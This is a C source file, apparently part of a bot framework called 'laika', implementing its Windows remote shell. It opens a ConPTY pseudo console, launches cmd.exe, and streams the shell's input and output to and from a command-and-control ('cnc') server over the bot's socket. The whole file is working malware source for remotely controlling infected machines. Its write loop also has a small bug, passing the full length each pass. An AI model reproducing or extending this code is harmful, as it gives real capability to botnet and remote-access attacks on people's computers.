/* platform specific code for opening shells (pseudo consoles) on windows */
#include "lerror.h"
#include "lmem.h"
#include "bot.h"
#include "shell.h"

#include <windows.h>
#include <process.h>

/* shells are significantly more complex on windows than linux for laika */
struct sLaika_shell {
    HANDLE in, out;
    PROCESS_INFORMATION procInfo;
    STARTUPINFOEX startupInfo;
    HPCON pseudoCon;
};

/* edited from https://github.com/microsoft/terminal/blob/main/samples/ConPTY/EchoCon/EchoCon/EchoCon.cpp */
HRESULT CreatePseudoConsoleAndPipes(HPCON *phPC, HANDLE *phPipeIn, HANDLE *phPipeOut, int cols, int rows) {
    COORD consoleSize = (COORD){.X = cols, .Y = rows};
    HANDLE hPipePTYIn = INVALID_HANDLE_VALUE;
    HANDLE hPipePTYOut = INVALID_HANDLE_VALUE;
    HRESULT hr;
    DWORD mode = PIPE_NOWAIT;

    /* create the pipes to which the ConPTY will connect */
    if (!CreatePipe(&hPipePTYIn, phPipeOut, NULL, 0) || !CreatePipe(phPipeIn, &hPipePTYOut, NULL, 0))
        return HRESULT_FROM_WIN32(GetLastError());

    /* anon pipes can be set to non-blocking for backwards compatibility. this makes our life much easier so it fits in nicely with
        the rest of the laika codebase (https://docs.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-setnamedpipehandlestate) */
    if (!SetNamedPipeHandleState(*phPipeIn, &mode, NULL, NULL))
        return HRESULT_FROM_WIN32(GetLastError());

    /* create the pseudo console of the required size, attached to the PTY - end of the pipes */
    hr = CreatePseudoConsole(consoleSize, hPipePTYIn, hPipePTYOut, 0, phPC);

    /* we can close the handles to the PTY-end of the pipes here
        because the handles are dup'ed into the ConHost and will be released
        when the ConPTY is destroyed. */
    CloseHandle(hPipePTYOut);
    CloseHandle(hPipePTYIn);
    return hr;
}

/* also edited from https://github.com/microsoft/terminal/blob/main/samples/ConPTY/EchoCon/EchoCon/EchoCon.cpp */
HRESULT InitializeStartupInfoAttachedToPseudoConsole(STARTUPINFOEX *pStartupInfo, HPCON hPC) {
    HRESULT hr = E_UNEXPECTED;

    if (pStartupInfo) {
        size_t attrListSize = 0;
        pStartupInfo->StartupInfo.cb = sizeof(STARTUPINFOEX);

        /* Get the size of the thread attribute list & allocate it */
        InitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);
        pStartupInfo->lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)laikaM_malloc(attrListSize);

        /* Initialize thread attribute list */
        if (pStartupInfo->lpAttributeList
            && InitializeProcThreadAttributeList(pStartupInfo->lpAttributeList, 1, 0, &attrListSize)){

            /* Set Pseudo Console attribute */
            hr = UpdateProcThreadAttribute(
                pStartupInfo->lpAttributeList,
                0,
                PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                hPC,
                sizeof(HPCON),
                NULL,
                NULL)
                ? S_OK : HRESULT_FROM_WIN32(GetLastError());
        } else {
            hr = HRESULT_FROM_WIN32(GetLastError());
        }
    }

    return hr;
}


struct sLaika_shell *laikaB_newShell(struct sLaika_bot *bot, int cols, int rows) {;
    HRESULT hr;
    char cmd[] = "cmd.exe";
    struct sLaika_shell* shell = (struct sLaika_shell*)laikaM_malloc(sizeof(struct sLaika_shell));

    ZeroMemory(shell, sizeof(struct sLaika_shell));

    /* create pty */
    hr = CreatePseudoConsoleAndPipes(&shell->pseudoCon, &shell->in, &shell->out, cols, rows);
    if (hr != S_OK) {
        laikaM_free(shell);
        return NULL;
    }

    /* create process */
    hr = InitializeStartupInfoAttachedToPseudoConsole(&shell->startupInfo, shell->pseudoCon);
    if (hr != S_OK) {
        ClosePseudoConsole(shell->pseudoCon);

        laikaM_free(shell);
        return NULL;
    }

    /* launch cmd shell */
    hr = CreateProcessA(
        NULL,                           /* No module name - use Command Line */
        cmd,                            /* Command Line */
        NULL,                           /* Process handle not inheritable */
        NULL,                           /* Thread handle not inheritable */
        FALSE,                          /* Inherit handles */
        EXTENDED_STARTUPINFO_PRESENT,   /* Creation flags */
        NULL,                           /* Use parent's environment block */
        NULL,                           /* Use parent's starting directory */
        &shell->startupInfo.StartupInfo,/* Pointer to STARTUPINFO */
        &shell->procInfo)               /* Pointer to PROCESS_INFORMATION */
        ? S_OK : HRESULT_FROM_WIN32(GetLastError());

    if (hr != S_OK) {
        DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
        laikaM_free(shell->startupInfo.lpAttributeList);
        
        ClosePseudoConsole(shell->pseudoCon);

        laikaM_free(shell);
        return NULL;
    }

    return shell;
}

void laikaB_freeShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
    /* kill process (it's ok if it fails) */
    TerminateProcess(shell->procInfo.hProcess, 0);

    /* cleanup process - info & thread */
    CloseHandle(shell->procInfo.hThread);
    CloseHandle(shell->procInfo.hProcess);

    /* Cleanup attribute list */
    DeleteProcThreadAttributeList(shell->startupInfo.lpAttributeList);
    laikaM_free(shell->startupInfo.lpAttributeList);

    /* close pseudo console */
    ClosePseudoConsole(shell->pseudoCon);

    /* free shell struct */
    laikaM_free(shell);
    bot->shell = NULL;
}

bool laikaB_readShell(struct sLaika_bot *bot, struct sLaika_shell *shell) {
    char readBuf[LAIKA_SHELL_DATA_MAX_LENGTH];
    struct sLaika_peer* peer = bot->peer;
    struct sLaika_socket* sock = &peer->sock;
    DWORD rd;
    bool readSucc = ReadFile(shell->in, readBuf, LAIKA_SHELL_DATA_MAX_LENGTH, &rd, NULL);

    if (readSucc) {
        /* we read some input! send to cnc */
        laikaS_startVarPacket(peer, LAIKAPKT_SHELL_DATA);
        laikaS_write(sock, readBuf, rd);
        laikaS_endVarPacket(peer);
    } else {
        if (GetLastError() == ERROR_NO_DATA)
            return true; /* recoverable, there was no data to read */

        /* tell cnc shell is closed */
        laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);

        /* kill shell */
        laikaB_freeShell(bot, shell);
        return false;
    }

    return true;
}

bool laikaB_writeShell(struct sLaika_bot *bot, struct sLaika_shell *shell, char *buf, size_t length) {
    struct sLaika_peer* peer = bot->peer;
    struct sLaika_socket* sock = &peer->sock;
    size_t nLeft;
    DWORD nWritten;

    nLeft = length;
    while (nLeft > 0) {
        if (!WriteFile(shell->out, (void*)buf, length, &nWritten, NULL)) {
            /* unrecoverable error */

            /* tell cnc shell is closed */
            laikaS_emptyOutPacket(peer, LAIKAPKT_SHELL_CLOSE);

            /* kill shell */
            laikaB_freeShell(bot, shell);
            return false;
        }

        if (nWritten == 0)
            break;

        nLeft -= nWritten;
        buf += nWritten;
    }

    return true;
}